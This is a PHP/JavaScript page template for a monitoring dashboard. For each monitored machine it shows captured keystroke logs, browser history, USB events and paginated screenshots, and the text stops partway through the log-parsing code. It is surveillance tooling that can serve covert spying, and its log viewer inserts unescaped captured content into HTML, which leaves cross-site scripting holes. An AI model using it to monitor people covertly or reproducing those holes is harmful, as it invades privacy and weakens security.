<?php
$title = 'Monitor Details - ' . $monitor['name'] . ' - ' . APP_NAME;
$active_page = 'view';
$page_title = 'Monitor Details';
ob_start();
?>
<style>
.live-status-badge {
    position: relative;
    display: inline-block;
}

.live-status-badge .pulse {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    border-radius: inherit;
    animation: pulse 2s infinite;
}

@keyframes pulse {
    0% {
        transform: scale(1);
        opacity: 1;
    }
    50% {
        transform: scale(1.1);
        opacity: 0.7;
    }
    100% {
        transform: scale(1);
        opacity: 1;
    }
}

.status-online {
    background: linear-gradient(45deg, #28a745, #20c997);
    border: none;
}

.status-inactive {
    background: linear-gradient(45deg, #ffc107, #fd7e14);
    border: none;
}

.status-offline {
    background: linear-gradient(45deg, #dc3545, #e83e8c);
    border: none;
}

.monitor-header {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    padding: 2rem 0;
    margin-bottom: 2rem;
}

.monitor-info {
    display: flex;
    align-items: center;
    gap: 1rem;
}

.monitor-avatar {
    width: 80px;
    height: 80px;
    background: rgba(255, 255, 255, 0.2);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 2rem;
}

.monitor-details h1 {
    margin: 0;
    font-size: 2rem;
    font-weight: 600;
}

.monitor-details p {
    margin: 0.5rem 0 0 0;
    opacity: 0.9;
}

.breadcrumb-nav {
    background: rgba(255, 255, 255, 0.1);
    padding: 0.5rem 1rem;
    border-radius: 0.375rem;
    margin-top: 1rem;
}

.breadcrumb-nav a {
    color: rgba(255, 255, 255, 0.8);
    text-decoration: none;
}

.breadcrumb-nav a:hover {
    color: white;
}

.breadcrumb-nav .separator {
    margin: 0 0.5rem;
    opacity: 0.6;
}

.log-table {
    font-size: 0.9rem;
}

.log-table th {
    background-color: #f8f9fa;
    font-weight: 600;
    border-bottom: 2px solid #dee2e6;
}

.log-table td {
    vertical-align: middle;
}

.log-table tbody tr:hover {
    background-color: rgba(0, 123, 255, 0.05);
}

.log-table .btn-group {
    display: flex;
    gap: 0.25rem;
}

/* Log modal table styles */
#logContentContainer .table,
#rawContentContainer .table {
    font-size: 0.85rem;
}

#logContentContainer .table th,
#rawContentContainer .table th {
    background-color: #f8f9fa;
    font-weight: 600;
    border-bottom: 2px solid #dee2e6;
    white-space: nowrap;
    position: sticky;
    top: 0;
    z-index: 10;
}

#logContentContainer .table td,
#rawContentContainer .table td {
    vertical-align: middle;
    max-width: 300px;
    word-wrap: break-word;
}

#logContentContainer .table tbody tr:hover,
#rawContentContainer .table tbody tr:hover {
    background-color: rgba(0, 123, 255, 0.05);
}

/* Badge styles for log entries */
.badge {
    font-size: 0.75rem;
    padding: 0.25rem 0.5rem;
}

/* Tab styles */
.nav-tabs .nav-link {
    font-size: 0.9rem;
    padding: 0.5rem 1rem;
}

.nav-tabs .nav-link.active {
    font-weight: 600;
}

/* Search input styles */
#logSearchInput,
#rawSearchInput {
    border-radius: 0.375rem;
    border: 1px solid #ced4da;
}

#logSearchInput:focus,
#rawSearchInput:focus {
    border-color: #86b7fe;
    box-shadow: 0 0 0 0.25rem rgba(13, 110, 253, 0.25);
}

/* Code display styles */
code {
    background-color: #f8f9fa;
    padding: 0.125rem 0.25rem;
    border-radius: 0.25rem;
    font-size: 0.875em;
    color: #d63384;
}

/* URL truncation */
.text-truncate {
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}

/* URL link styles */
#logContentContainer a,
#rawContentContainer a {
    color: #0d6efd;
    text-decoration: none;
    word-break: break-all;
}

#logContentContainer a:hover,
#rawContentContainer a:hover {
    color: #0a58ca;
    text-decoration: underline;
}

#logContentContainer a:focus,
#rawContentContainer a:focus {
    outline: 2px solid #0d6efd;
    outline-offset: 2px;
}

/* Responsive table */
.table-responsive {
    max-height: 60vh;
    overflow-y: auto;
}

/* Screenshot grid styles */
.screenshot-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
    gap: 1rem;
    margin-bottom: 1rem;
}

.screenshot-item {
    border: 1px solid #dee2e6;
    border-radius: 0.375rem;
    overflow: hidden;
    cursor: pointer;
    transition: transform 0.2s, box-shadow 0.2s;
}

.screenshot-item:hover {
    transform: translateY(-2px);
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
}

.screenshot-item img {
    width: 100%;
    height: 200px;
    object-fit: cover;
}

.screenshot-info {
    padding: 0.75rem;
    background: #f8f9fa;
}

/* Pagination styles */
.pagination {
    margin-bottom: 0;
}

.page-link {
    padding: 0.375rem 0.75rem;
    font-size: 0.875rem;
}

/* Loading spinner */
.fa-spinner {
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
</style>

<!-- Monitor Header -->
<div class="monitor-header">
    <div class="container">
        <div class="monitor-info">
            <div class="monitor-avatar">
                <i class="fas fa-desktop"></i>
            </div>
            <div class="monitor-details">
                <h1><?php echo htmlspecialchars($monitor['name']); ?></h1>
                <p>
                    <i class="fas fa-network-wired me-2"></i>
                    <?php echo htmlspecialchars($monitor['ip_address']); ?>
                    <?php if (!empty($monitor['username']) && $monitor['username'] !== 'Unknown'): ?>
                        <span class="ms-3">
                            <i class="fas fa-user me-1"></i>
                            <?php echo htmlspecialchars($monitor['username']); ?>
                        </span>
                    <?php endif; ?>
                </p>
                <div class="breadcrumb-nav">
                    <a href="<?php echo BASE_URL; ?>view">
                        <i class="fas fa-home me-1"></i>View Data
                    </a>
                    <span class="separator">/</span>
                    <span>Monitor Details</span>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="container">
    <!-- Monitor Status Card -->
    <div class="row mb-4">
        <div class="col-12">
            <div class="card">
                <div class="card-body">
                    <div class="row align-items-center">
                        <div class="col-md-6">
                            <h5 class="card-title mb-0">
                                <i class="fas fa-info-circle me-2 text-primary"></i>
                                Monitor Information
                            </h5>
                        </div>
                        <div class="col-md-6 text-md-end">
                            <div class="live-status-badge">
                                <span class="badge status-online">
                                    <i class="fas fa-circle me-1"></i>Online
                                    <div class="pulse"></div>
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Tab Navigation -->
<div class="row">
    <div class="col-12">
        <div class="card">
            <div class="card-header">
                <ul class="nav nav-tabs card-header-tabs" id="monitorTabs" role="tablist">
                    <li class="nav-item" role="presentation">
                        <button class="nav-link active" id="logs-tab" data-bs-toggle="tab" data-bs-target="#logs-content" type="button" role="tab">
                            <i class="fas fa-file-alt me-2"></i>Activity Logs
                        </button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="screenshots-tab" data-bs-toggle="tab" data-bs-target="#screenshots-content" type="button" role="tab">
                            <i class="fas fa-image me-2"></i>Screenshots
                            <span class="badge bg-secondary ms-2" id="screenshot-count">0</span>
                        </button>
                    </li>
                </ul>
            </div>
            <div class="card-body">
                <div class="tab-content" id="monitorTabContent">
                    <!-- Logs Tab -->
                    <div class="tab-pane fade show active" id="logs-content" role="tabpanel">
                        <!-- Log Type Navigation -->
                        <ul class="nav nav-pills mb-3" id="logTypeTabs" role="tablist">
                            <li class="nav-item" role="presentation">
                                <button class="nav-link active" id="browser-tab" data-bs-toggle="pill" data-bs-target="#browser-content" type="button" role="tab">
                                    <i class="fas fa-globe me-2"></i>Browser History
                                    <span class="badge bg-primary ms-2"><?php echo count($logs['browser_history']); ?></span>
                                </button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" id="keys-tab" data-bs-toggle="pill" data-bs-target="#keys-content" type="button" role="tab">
                                    <i class="fas fa-keyboard me-2"></i>Key Logs
                                    <span class="badge bg-warning ms-2"><?php echo count($logs['key_logs']); ?></span>
                                </button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" id="usb-tab" data-bs-toggle="pill" data-bs-target="#usb-content" type="button" role="tab">
                                    <i class="fas fa-usb me-2"></i>USB Logs
                                    <span class="badge bg-info ms-2"><?php echo count($logs['usb_logs']); ?></span>
                                </button>
                            </li>
                        </ul>

                        <!-- Log Type Content -->
                        <div class="tab-content" id="logTypeTabContent">
                            <!-- Browser History Tab -->
                            <div class="tab-pane fade show active" id="browser-content" role="tabpanel">
                                <div class="p-3">
                                    <?php if (empty($logs['browser_history'])): ?>
                                        <div class="text-center py-4">
                                            <i class="fas fa-globe fa-3x text-muted mb-3"></i>
                                            <h5 class="text-muted">No Browser History</h5>
                                            <p class="text-muted">No browser history logs available for this monitor.</p>
                                        </div>
                                    <?php else: ?>
                                        <div class="table-responsive">
                                            <table class="table table-sm table-hover log-table">
                                                <thead>
                                                    <tr>
                                                        <th>Date</th>
                                                        <th>File</th>
                                                        <th>Size</th>
                                                        <th>Actions</th>
                                                    </tr>
                                                </thead>
                                                <tbody>
                                                    <?php foreach ($logs['browser_history'] as $log): ?>
                                                        <tr>
                                                            <td><?php echo date('M j, Y H:i:s', filemtime($log['path'])); ?></td>
                                                            <td><?php echo htmlspecialchars($log['file']); ?></td>
                                                            <td><?php echo $this->formatFileSize(filesize($log['path'])); ?></td>
                                                            <td>
                                                                <button class="btn btn-sm btn-outline-primary" onclick="viewLogFile('<?php echo htmlspecialchars($log['path']); ?>')">
                                                                    <i class="fas fa-table me-1"></i>View Table
                                                                </button>
                                                                <a href="<?php echo BASE_URL . $log['path']; ?>" class="btn btn-sm btn-outline-secondary" target="_blank">
                                                                    <i class="fas fa-download me-1"></i>Download
                                                                </a>
                                                            </td>
                                                        </tr>
                                                    <?php endforeach; ?>
                                                </tbody>
                                            </table>
                                        </div>
                                    <?php endif; ?>
                                </div>
                            </div>

                            <!-- Key Logs Tab -->
                            <div class="tab-pane fade" id="keys-content" role="tabpanel">
                                <div class="p-3">
                                    <?php if (empty($logs['key_logs'])): ?>
                                        <div class="text-center py-4">
                                            <i class="fas fa-keyboard fa-3x text-muted mb-3"></i>
                                            <h5 class="text-muted">No Key Logs</h5>
                                            <p class="text-muted">No key logs available for this monitor.</p>
                                        </div>
                                    <?php else: ?>
                                        <div class="table-responsive">
                                            <table class="table table-sm table-hover log-table">
                                                <thead>
                                                    <tr>
                                                        <th>Date</th>
                                                        <th>File</th>
                                                        <th>Size</th>
                                                        <th>Actions</th>
                                                    </tr>
                                                </thead>
                                                <tbody>
                                                    <?php foreach ($logs['key_logs'] as $log): ?>
                                                        <tr>
                                                            <td><?php echo date('M j, Y H:i:s', filemtime($log['path'])); ?></td>
                                                            <td><?php echo htmlspecialchars($log['file']); ?></td>
                                                            <td><?php echo $this->formatFileSize(filesize($log['path'])); ?></td>
                                                            <td>
                                                                <button class="btn btn-sm btn-outline-primary" onclick="viewLogFile('<?php echo htmlspecialchars($log['path']); ?>')">
                                                                    <i class="fas fa-table me-1"></i>View Table
                                                                </button>
                                                                <a href="<?php echo BASE_URL . $log['path']; ?>" class="btn btn-sm btn-outline-secondary" target="_blank">
                                                                    <i class="fas fa-download me-1"></i>Download
                                                                </a>
                                                            </td>
                                                        </tr>
                                                    <?php endforeach; ?>
                                                </tbody>
                                            </table>
                                        </div>
                                    <?php endif; ?>
                                </div>
                            </div>

                            <!-- USB Logs Tab -->
                            <div class="tab-pane fade" id="usb-content" role="tabpanel">
                                <div class="p-3">
                                    <?php if (empty($logs['usb_logs'])): ?>
                                        <div class="text-center py-4">
                                            <i class="fas fa-usb fa-3x text-muted mb-3"></i>
                                            <h5 class="text-muted">No USB Logs</h5>
                                            <p class="text-muted">No USB logs available for this monitor.</p>
                                        </div>
                                    <?php else: ?>
                                        <div class="table-responsive">
                                            <table class="table table-sm table-hover log-table">
                                                <thead>
                                                    <tr>
                                                        <th>Date</th>
                                                        <th>File</th>
                                                        <th>Size</th>
                                                        <th>Actions</th>
                                                    </tr>
                                                </thead>
                                                <tbody>
                                                    <?php foreach ($logs['usb_logs'] as $log): ?>
                                                        <tr>
                                                            <td><?php echo date('M j, Y H:i:s', filemtime($log['path'])); ?></td>
                                                            <td><?php echo htmlspecialchars($log['file']); ?></td>
                                                            <td><?php echo $this->formatFileSize(filesize($log['path'])); ?></td>
                                                            <td>
                                                                <button class="btn btn-sm btn-outline-primary" onclick="viewLogFile('<?php echo htmlspecialchars($log['path']); ?>')">
                                                                    <i class="fas fa-table me-1"></i>View Table
                                                                </button>
                                                                <a href="<?php echo BASE_URL . $log['path']; ?>" class="btn btn-sm btn-outline-secondary" target="_blank">
                                                                    <i class="fas fa-download me-1"></i>Download
                                                                </a>
                                                            </td>
                                                        </tr>
                                                    <?php endforeach; ?>
                                                </tbody>
                                            </table>
                                        </div>
                                    <?php endif; ?>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Screenshots Tab -->
                    <div class="tab-pane fade" id="screenshots-content" role="tabpanel">
                        <div class="p-3">
                            <div id="screenshots-container">
                                <div class="text-center py-4">
                                    <i class="fas fa-spinner fa-spin fa-2x text-muted mb-3"></i>
                                    <p class="text-muted">Loading screenshots...</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Log Modal -->
<div class="modal fade" id="logModal" tabindex="-1">
    <div class="modal-dialog modal-xl">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="logModalTitle">Log File Content</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body">
                <!-- Log View Tabs -->
                <ul class="nav nav-tabs" id="logViewTabs" role="tablist">
                    <li class="nav-item" role="presentation">
                        <button class="nav-link active" id="table-tab" data-bs-toggle="tab" data-bs-target="#table-content" type="button" role="tab">
                            <i class="fas fa-table me-2"></i>Table View
                        </button>
                    </li>
                    <li class="nav-item" role="presentation">
                        <button class="nav-link" id="raw-tab" data-bs-toggle="tab" data-bs-target="#raw-content" type="button" role="tab">
                            <i class="fas fa-file-alt me-2"></i>Raw Text
                        </button>
                    </li>
                </ul>
                
                <!-- Tab Content -->
                <div class="tab-content mt-3" id="logViewTabContent">
                    <!-- Table View Tab -->
                    <div class="tab-pane fade show active" id="table-content" role="tabpanel">
                        <div id="logContentContainer">
                            <div class="text-center py-4">
                                <i class="fas fa-spinner fa-spin fa-2x text-muted mb-3"></i>
                                <p class="text-muted">Loading log content...</p>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Raw Text Tab -->
                    <div class="tab-pane fade" id="raw-content" role="tabpanel">
                        <div id="rawContentContainer">
                            <div class="text-center py-4">
                                <i class="fas fa-spinner fa-spin fa-2x text-muted mb-3"></i>
                                <p class="text-muted">Loading raw content...</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Screenshot Modal -->
<div class="modal fade" id="screenshotModal" tabindex="-1">
    <div class="modal-dialog modal-xl">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="screenshotModalTitle">Screenshot</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body text-center">
                <img id="screenshotModalImage" src="" alt="Screenshot" class="img-fluid">
            </div>
        </div>
    </div>
</div>

<script>
// Wait for jQuery to be available
function waitForJQuery(callback) {
    if (typeof jQuery !== 'undefined') {
        callback();
    } else {
        setTimeout(function() {
            waitForJQuery(callback);
        }, 100);
    }
}

// Initialize when jQuery is ready
waitForJQuery(function() {
    // Load screenshots when screenshots tab is clicked
    $('#screenshots-tab').on('shown.bs.tab', function() {
        loadScreenshots();
    });
});

// Insert date filter UI only when screenshots tab is shown, and only once
waitForJQuery(function() {
    let dateFilterInserted = false;
    $('#screenshots-tab').on('shown.bs.tab', function() {
        if (!dateFilterInserted) {
            const today = new Date().toISOString().split('T')[0];
            const filterHtml = `
                <form id="dateFilterForm" class="mb-3 d-flex flex-wrap align-items-center gap-2">
                    <label for="startDate" class="form-label mb-0">Start Date:</label>
                    <input type="date" id="startDate" name="start_date" class="form-control form-control-sm" style="width: 160px;" value="${today}">
                    <label for="endDate" class="form-label mb-0">End Date:</label>
                    <input type="date" id="endDate" name="end_date" class="form-control form-control-sm" style="width: 160px;" value="${today}">
                    <button type="submit" class="btn btn-sm btn-primary">Filter</button>
                    <button type="button" id="clearDateFilter" class="btn btn-sm btn-secondary">Clear</button>
                </form>
            `;
            $('#screenshots-container').before(filterHtml);
            $('#dateFilterForm').on('submit', function(e) {
                e.preventDefault();
                loadScreenshots(1);
            });
            $('#clearDateFilter').on('click', function() {
                $('#startDate').val('');
                $('#endDate').val('');
                loadScreenshots(1);
            });
            dateFilterInserted = true;
        }
    });
});

function viewLogFile(filePath) {
    // Extract log type from file path
    let logType = 'generic';
    if (filePath.includes('browser_history')) {
        logType = 'browser_history';
    } else if (filePath.includes('key_logs')) {
        logType = 'key_logs';
    } else if (filePath.includes('usb_logs')) {
        logType = 'usb_logs';
    }
    
    console.log("Loading log:", filePath, "Type:", logType);
    
    // Show loading state for both tabs
    $("#logContentContainer").html(`
        <div class="text-center py-4">
            <i class="fas fa-spinner fa-spin fa-2x text-muted mb-3"></i>
            <p class="text-muted">Loading log content...</p>
        </div>
    `);
    
    $("#rawContentContainer").html(`
        <div class="text-center py-4">
            <i class="fas fa-spinner fa-spin fa-2x text-muted mb-3"></i>
            <p class="text-muted">Loading raw content...</p>
        </div>
    `);
    
    // Load raw content first, then parse it for table view
    const fileUrl = "<?php echo BASE_URL; ?>" + filePath;
    $.get(fileUrl, function(data) {
        // Display raw content
        displayRawContent(data, filePath);
        
        // Parse and display table content
        const parsedData = parseLogData(data, logType);
        displayParsedLog(parsedData.data, parsedData.headers, logType, filePath);
    }).fail(function(xhr, status, error) {
        console.log("Failed to load file:", error);
        const errorHtml = `
            <div class="text-center py-4">
                <i class="fas fa-exclamation-triangle fa-2x text-danger mb-3"></i>
                <h5 class="text-danger">Failed to Load Content</h5>
                <p class="text-muted">Error: ${error} (Status: ${xhr.status})</p>
            </div>
        `;
        $("#logContentContainer").html(errorHtml);
        $("#rawContentContainer").html(errorHtml);
    });
    
    $("#logModalTitle").text("Log Content - " + filePath.split('/').pop());
    $("#logModal").modal("show");
}

function displayParsedLog(data, headers, logType, filePath) {
    if (!data || data.length === 0) {
        $("#logContentContainer").html(`
            <div class="text-center py-4">
                <i class="fas fa-inbox fa-3x text-muted mb-3"></i>
                <h5 class="text-muted">No Log Entries</h5>
                <p class="text-muted">This log file contains no parseable entries.</p>
            </div>
        `);
        return;
    }
    
    // Get icon and classes for log type
    const icons = {
        'browser_history': 'fas fa-globe text-primary',
        'key_logs': 'fas fa-keyboard text-warning',
        'usb_logs': 'fas fa-usb text-info',
        'generic': 'fas fa-file-alt text-secondary'
    };
    
    const icon = icons[logType] || icons['generic'];
    
    let html = `
        <div class="d-flex justify-content-between align-items-center mb-3">
            <div>
                <i class="${icon} me-2"></i>
                <span class="fw-bold">${data.length} log entries</span>
            </div>
            <div class="btn-group" role="group">
                <input type="text" class="form-control form-control-sm me-2" id="logSearchInput" placeholder="Search logs..." style="width: 200px;">
                <button type="button" class="btn btn-sm btn-outline-secondary" onclick="downloadLogFile('${filePath}')">
                    <i class="fas fa-download me-1"></i>Download Raw
                </button>
            </div>
        </div>
        <div class="table-responsive">
            <table class="table table-sm table-hover" id="logDataTable">
                <thead class="table-light">
                    <tr>
    `;
    
    // Add headers
    headers.forEach(header => {
        html += `<th>${header}</th>`;
    });
    
    html += `
                    </tr>
                </thead>
                <tbody>
    `;
    
    // Add data rows
    data.forEach(row => {
        html += '<tr>';
        headers.forEach(header => {
            const key = header.toLowerCase().replace(/\s+/g, '');
            const value = row[key] || row[Object.keys(row).find(k => k.toLowerCase().includes(key.toLowerCase()))] || '';
            
            // Format special fields
            let displayValue = value;
            if (key === 'url' && value.length > 80) {
                displayValue = `<a href="${value}" target="_blank" title="${value}" class="text-truncate d-inline-block" style="max-width: 300px;">${value.substring(0, 77)}...</a>`;
            } else if (key === 'url') {
                displayValue = `<a href="${value}" target="_blank" title="${value}">${value}</a>`;
            } else if (key === 'title' && value.length > 60) {
                displayValue = `<span title="${value}" class="text-truncate d-inline-block" style="max-width: 250px;">${value.substring(0, 57)}...</span>`;
            } else if (key === 'key') {
                displayValue = `<span class="badge bg-light text-dark border">${value}</span>`;
            } else if (key === 'action') {
                const actionClass = value.toLowerCase() === 'connected' ? 'bg-success' : 
                                  value.toLowerCase() === 'disconnected' ? 'bg-danger' : 
                                  value.toLowerCase() === 'keydown' ? 'bg-primary' :
                                  value.toLowerCase() === 'keyup' ? 'bg-secondary' : 'bg-info';
                displayValue = `<span class="badge ${actionClass}">${value}</span>`;
            } else if (key === 'browser') {
                displayValue = `<span class="badge bg-primary">${value}</span>`;
            } else if (key === 'application') {
                displayValue = `<span class="badge bg-info">${value}</span>`;
            } else if (key === 'device') {
                displayValue = `<span class="badge bg-warning text-dark">${value}</span>`;
            } else if (key === 'date') {
                // Format date for better readability
                const date = new Date(value);
                if (!isNaN(date.getTime())) {
                    displayValue = `<small class="text-muted">${date.toLocaleString()}</small>`;
                } else {
                    displayValue = `<small class="text-muted">${value}</small>`;
                }
            } else if (key === 'content') {
                displayValue = `<code class="small">${value}</code>`;
            } else if (key === 'line') {
                displayValue = `<span class="badge bg-secondary">${value}</span>`;
            }
            
            html += `<td>${displayValue}</td>`;
        });
        html += '</tr>';
    });
    
    html += `
                </tbody>
            </table>
        </div>
    `;
    
    $("#logContentContainer").html(html);
    
    // Add search functionality
    $("#logSearchInput").on("keyup", function() {
        const searchTerm = $(this).val().toLowerCase();
        $("#logDataTable tbody tr").each(function() {
            const rowText = $(this).text().toLowerCase();
            if (rowText.includes(searchTerm)) {
                $(this).show();
            } else {
                $(this).hide();
            }
        });
    });
}

function displayRawContent(data, filePath) {
    if (!data) {
        $("#rawContentContainer").html(`
            <div class="text-center py-4">
                <i class="fas fa-inbox fa-3x text-muted mb-3"></i>
                <h5 class="text-muted">No Raw Content</h5>
                <p class="text-muted">This log file is empty or could not be loaded.</p>
            </div>
        `);
        return;
    }

    let html = `
        <div class="d-flex justify-content-between align-items-center mb-3">
            <div>
                <i class="fas fa-file-alt text-secondary me-2"></i>
                <span class="fw-bold">Raw Log Content (${data.split('\n').length} lines)</span>
            </div>
            <div class="btn-group" role="group">
                <input type="text" class="form-control form-control-sm me-2" id="rawSearchInput" placeholder="Search raw content..." style="width: 200px;">
                <button type="button" class="btn btn-sm btn-outline-secondary" onclick="downloadLogFile('${filePath}')">
                    <i class="fas fa-download me-1"></i>Download Raw
                </button>
            </div>
        </div>
        <div class="table-responsive">
            <table class="table table-sm table-hover" id="rawDataTable">
                <thead class="table-light">
                    <tr>
                        <th style="width: 60px;">Line</th>
                        <th>Content</th>
                    </tr>
                </thead>
                <tbody>
    `;

    const lines = data.split('\n');
    lines.forEach((line, index) => {
        if (line.trim() === '') {
            html += `
                <tr class="table-light">
                    <td class="text-muted">${index + 1}</td>
                    <td class="text-muted"><em>Empty line</em></td>
                </tr>
            `;
        } else {
            html += `
                <tr>
                    <td class="text-muted fw-bold">${index + 1}</td>
                    <td><code class="small">${line}</code></td>
                </tr>
            `;
        }
    });

    html += `
                </tbody>
            </table>
        </div>
    `;

    $("#rawContentContainer").html(html);
    
    // Add search functionality for raw content
    $("#rawSearchInput").on("keyup", function() {
        const searchTerm = $(this).val().toLowerCase();
        $("#rawDataTable tbody tr").each(function() {
            const rowText = $(this).text().toLowerCase();
            if (rowText.includes(searchTerm)) {
                $(this).show();
            } else {
                $(this).hide();
            }
        });
    });
}

function downloadLogFile(filePath) {
    const fileUrl = "<?php echo BASE_URL; ?>" + filePath;
    window.open(fileUrl, '_blank');
}

// Enhanced time formatting function
function formatTimeAgo(seconds) {
    if (seconds < 60) {
        return `${seconds}s ago`;
    } else if (seconds < 3600) {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes}m ${remainingSeconds}s ago`;
    } else if (seconds < 86400) {
        const hours = Math.floor(seconds / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const remainingSeconds = seconds % 60;
        return `${hours}h ${minutes}m ${remainingSeconds}s ago`;
    } else {
        const days = Math.floor(seconds / 86400);
        const hours = Math.floor((seconds % 86400) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        return `${days}d ${hours}h ${minutes}m ago`;
    }
}

// Update loadScreenshots to send date filter params and use backend pagination
function loadScreenshots(page = 1) {
    const monitorId = <?php echo $monitor['id']; ?>;
    const startDate = $('#startDate').val();
    const endDate = $('#endDate').val();
    let url = `<?php echo BASE_URL; ?>view/api_all_screenshots/${monitorId}?page=${page}&per_page=150`;
    if (startDate) url += `&start_date=${startDate}`;
    if (endDate) url += `&end_date=${endDate}`;
    $.ajax({
        url: url,
        method: "GET",
        success: function(response) {
            if (response.screenshots) {
                displayScreenshots(response.screenshots, response.pagination);
            } else {
                displayScreenshots(response, null);
            }
        },
        error: function(xhr, status, error) {
            console.log("Failed to load screenshots:", error);
            $("#screenshots-container").html(`
                <div class="text-center py-4">
                    <i class="fas fa-exclamation-triangle fa-2x text-danger mb-3"></i>
                    <h5 class="text-danger">Failed to Load Screenshots</h5>
                    <p class="text-muted">Error: ${error}</p>
                </div>
            `);
        }
    });
}

// Use time_diff_seconds for time-ago display
function displayScreenshots(screenshots, pagination = null) {
    const container = $("#screenshots-container");
    if (screenshots.length === 0) {
        container.html(`
            <div class="text-center py-4">
                <i class="fas fa-image fa-3x text-muted mb-3"></i>
                <h5 class="text-muted">No Screenshots Available</h5>
                <p class="text-muted">No screenshots have been captured for this monitor.</p>
            </div>
        `);
        $("#screenshot-count").text("0");
        return;
    }
    if (pagination) {
        $("#screenshot-count").text(`${pagination.total_screenshots} total`);
    } else {
        $("#screenshot-count").text(screenshots.length);
    }
    let html = '<div class="screenshot-grid">';
    screenshots.forEach(function(screenshot) {
        const thumbnailUrl = "<?php echo BASE_URL; ?>" + screenshot.thumbnail_path;
        const fullUrl = "<?php echo BASE_URL; ?>" + screenshot.full_path;
        let timeAgo = '';
        if (typeof screenshot.time_diff_seconds !== 'undefined') {
            const diff = screenshot.time_diff_seconds;
            if (diff <= 0) {
                timeAgo = 'Just now';
            } else {
                timeAgo = formatTimeAgo(diff);
            }
        } else {
            timeAgo = screenshot.modified || 'Unknown';
        }
        html += `
        <div class="screenshot-item" onclick="viewScreenshot('${fullUrl}', '${screenshot.filename}')">
            <img src="${thumbnailUrl}" alt="Screenshot" loading="lazy">
            <div class="screenshot-info">
                <div class="d-flex justify-content-between align-items-center">
                    <small class="text-muted">${screenshot.filename}</small>
                    <span class="badge badge-sm bg-secondary">${screenshot.size}</span>
                </div>
                <small class="text-muted d-block">
                    <i class="fas fa-clock me-1"></i>${timeAgo}
                </small>
                <small class="text-muted d-block">
                    <i class="fas fa-calendar me-1"></i>${screenshot.modified || 'Unknown'}
                </small>
            </div>
        </div>
        `;
    });
    html += '</div>';
    // Add pagination controls if pagination data is available
    if (pagination && pagination.total_pages > 1) {
        html += `
            <div class="d-flex justify-content-between align-items-center mt-4">
                <div class="text-muted">
                    Showing ${((pagination.current_page - 1) * pagination.per_page) + 1} to ${Math.min(pagination.current_page * pagination.per_page, pagination.total_screenshots)} of ${pagination.total_screenshots} screenshots
                </div>
                <nav aria-label="Screenshots Pagination">
                    <ul class="pagination pagination-sm mb-0">
                        <li class="page-item ${pagination.current_page === 1 ? 'disabled' : ''}">
                            <a class="page-link" href="#" onclick="loadScreenshots(${pagination.current_page - 1}); return false;">
                                <i class="fas fa-chevron-left"></i>
                            </a>
                        </li>
                        ${generatePageNumbers(pagination.current_page, pagination.total_pages)}
                        <li class="page-item ${pagination.current_page === pagination.total_pages ? 'disabled' : ''}">
                            <a class="page-link" href="#" onclick="loadScreenshots(${pagination.current_page + 1}); return false;">
                                <i class="fas fa-chevron-right"></i>
                            </a>
                        </li>
                    </ul>
                </nav>
            </div>
        `;
    }
    container.html(html);
}

function generatePageNumbers(currentPage, totalPages) {
    let html = '';
    const maxVisible = 5;
    
    if (totalPages <= maxVisible) {
        // Show all pages if total is small
        for (let i = 1; i <= totalPages; i++) {
            html += `
                <li class="page-item ${i === currentPage ? 'active' : ''}">
                    <a class="page-link" href="#" onclick="loadScreenshots(${i}); return false;">${i}</a>
                </li>
            `;
        }
    } else {
        // Show smart pagination
        let start = Math.max(1, currentPage - 2);
        let end = Math.min(totalPages, start + maxVisible - 1);
        
        if (end - start + 1 < maxVisible) {
            start = Math.max(1, end - maxVisible + 1);
        }
        
        if (start > 1) {
            html += `
                <li class="page-item">
                    <a class="page-link" href="#" onclick="loadScreenshots(1); return false;">1</a>
                </li>
                <li class="page-item disabled">
                    <span class="page-link">...</span>
                </li>
            `;
        }
        
        for (let i = start; i <= end; i++) {
            html += `
                <li class="page-item ${i === currentPage ? 'active' : ''}">
                    <a class="page-link" href="#" onclick="loadScreenshots(${i}); return false;">${i}</a>
                </li>
            `;
        }
        
        if (end < totalPages) {
            html += `
                <li class="page-item disabled">
                    <span class="page-link">...</span>
                </li>
                <li class="page-item">
                    <a class="page-link" href="#" onclick="loadScreenshots(${totalPages}); return false;">${totalPages}</a>
                </li>
            `;
        }
    }
    
    return html;
}

function viewScreenshot(imageUrl, filename) {
    $("#screenshotModalImage").attr("src", imageUrl);
    $("#screenshotModalTitle").text("Screenshot - " + filename);
    $("#screenshotModal").modal("show");
}

function parseLogData(data, logType) {
    if (!data || data.trim() === '') {
        console.log("Empty data received for log type:", logType);
        return { data: [], headers: [] };
    }
    
    const lines = data.split('\n').filter(line => line.trim() !== '');
    console.log(`Parsing ${lines.length} lines for log type: ${logType}`);
    
    switch (logType) {
        case 'browser_history':
            return parseBrowserHistory(lines);
        case 'key_logs':
            return parseKeyLogs(lines);
        case 'usb_logs':
            return parseUsbLogs(lines);
        default:
            return parseGenericLog(lines);
    }
}

